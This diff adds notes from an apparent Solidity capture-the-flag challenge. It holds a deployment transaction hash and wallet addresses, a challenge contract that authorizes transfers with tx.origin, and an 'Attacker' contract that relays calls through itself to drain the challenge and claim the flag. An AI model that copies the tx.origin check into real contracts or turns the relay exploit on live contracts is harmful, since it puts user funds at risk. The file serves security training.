@@ -1,0 +1,76 @@
+Origin Deploy - Transaction hash
+0x134a5f9318dd1c99613689f2f6820b1cc7397945124cdc07ffeb6cd2cd1ec35c
+
+From/My Wallet (Same used to deploy)
+0x14F9788B129e8BFb4fC5c0EAFB5871CbfCDd28f3
+
+Contract.Address
+0x4b6fd8C9d8676B2f1878a66790fa803F433Cb5Aa
+
+
+====================================================================================
+____origin.sol____
+
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.4;
+
+contract Origin{
+
+    string flag;
+    address payable public owner;
+    address winner;
+
+    constructor(string memory _flag) public payable {
+        flag = _flag;
+        owner = payable(msg.sender);
+    }
+
+    function transfer(address payable _to, uint _amount) public {
+        require(tx.origin == owner, "No Owner");
+        winner = msg.sender;
+
+        (bool sent, ) = _to.call{value: _amount}("");
+        require(sent, "Fallo al enviar cantidad");
+    }
+
+    receive() external payable{}
+
+    function balanceTotal() public view returns(uint){
+        return address(this).balance;
+    }
+
+    function getFlag() public view returns (string memory){
+        require(address(this).balance==0,"No has conseguido el ETH");
+        require(winner == msg.sender,"No eres el winner. Usa tu smartcontract");
+        return flag;
+    }
+
+}
+_____exploit_origin.sol_____
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.4;
+
+import './origin.sol'; // You need to import the Origin contract
+
+interface IOrigin {
+    function transfer(address payable _to, uint _amount) external;
+}
+
+contract Attacker {
+    IOrigin originContract;
+    address payable owner;
+    
+    constructor(address _originAddress) {
+        originContract = IOrigin(_originAddress);
+        owner = payable(msg.sender);
+    }
+
+    function attack(address payable _to, uint _amount) public {
+        require(tx.origin == owner, "Not owner");
+        originContract.transfer(_to, _amount);
+    }
+}
+
+====================================================================================
